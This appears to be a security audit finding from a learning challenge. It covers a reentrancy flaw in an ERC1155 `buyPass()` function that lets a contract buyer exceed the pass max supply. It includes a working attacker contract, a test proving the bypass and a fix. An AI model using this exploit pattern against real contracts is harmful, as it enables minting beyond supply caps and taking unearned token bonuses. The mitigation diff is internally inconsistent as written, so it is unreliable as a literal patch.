# H-02: ERC1155 receiver reentrancy in `buyPass()` can bypass pass max supply

## Summary

`buyPass()` calls ERC1155 `_mint()` before incrementing `passSupply`. When the buyer is a contract, `_mint()` invokes the ERC1155 receiver hook on the buyer. A malicious receiver can reenter `buyPass()` before `passSupply` is updated, allowing more passes to be minted than `passMaxSupply`.

## Vulnerability Details

`buyPass()` checks supply, mints the pass, and only then increments supply:

```solidity
function buyPass(uint256 collectionId) external payable {
    require(collectionId == GENERAL_PASS || collectionId == VIP_PASS || collectionId == BACKSTAGE_PASS, "Invalid pass ID");
    require(msg.value == passPrice[collectionId], "Incorrect payment amount");
    require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");

    _mint(msg.sender, collectionId, 1, "");
    ++passSupply[collectionId];

    uint256 bonus = (collectionId == VIP_PASS) ? 5e18 : (collectionId == BACKSTAGE_PASS) ? 15e18 : 0;
    if (bonus > 0) {
        BeatToken(beatToken).mint(msg.sender, bonus);
    }
    emit PassPurchased(msg.sender, collectionId);
}
```

For ERC1155, minting to a contract can call `onERC1155Received()`. During that callback, the receiver can call `buyPass()` again. Because `passSupply` has not been incremented yet, the reentrant call observes stale supply and passes the max supply check.

## Impact

Attackers can mint more passes than the configured max supply. This breaks scarcity guarantees for limited pass tiers such as VIP and backstage passes, and can also mint extra welcome BEAT bonuses for those tiers.

## Proof of Concept

```solidity
contract ReentrantPassBuyer is IERC1155Receiver {
    FestivalPass public festivalPass;
    uint256 public passId;
    uint256 public price;
    bool internal reentered;

    constructor(FestivalPass _festivalPass, uint256 _passId, uint256 _price) payable {
        festivalPass = _festivalPass;
        passId = _passId;
        price = _price;
    }

    function attack() external {
        festivalPass.buyPass{value: price}(passId);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
        external
        returns (bytes4)
    {
        if (!reentered) {
            reentered = true;
            festivalPass.buyPass{value: price}(passId);
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId;
    }
}

function testBuyPassReentrancyBypassesMaxSupply() public {
    vm.prank(organizer);
    festivalPass.configurePass(1, GENERAL_PRICE, 1);

    ReentrantPassBuyer attacker = new ReentrantPassBuyer{value: 2 * GENERAL_PRICE}(
        festivalPass,
        1,
        GENERAL_PRICE
    );

    attacker.attack();

    assertEq(festivalPass.balanceOf(address(attacker), 1), 2);
    assertEq(festivalPass.passMaxSupply(1), 1);
}
```

## Recommended Mitigation

Follow checks-effects-interactions by updating `passSupply` before `_mint()`. Adding `ReentrancyGuard` is also useful defense in depth.

```diff
 require(msg.value == passPrice[collectionId], "Incorrect payment amount");
 require(passSupply[collectionId] < passMaxSupply[collectionId], "Max supply reached");
-_mint(msg.sender, collectionId, 1, "");
 ++passSupply[collectionId];
+_mint(msg.sender, collectionId, 1, "");
-++passSupply[collectionId];
```

## Learning Notes

ERC1155 `_mint()` is an external interaction when the recipient is a contract. State used for supply checks should be updated before the receiver hook can run.

Relevant concepts: reentrancy, ERC1155 receiver hooks, checks-effects-interactions, supply cap bypass.

## Analysis Disclosure

Challenge learning.
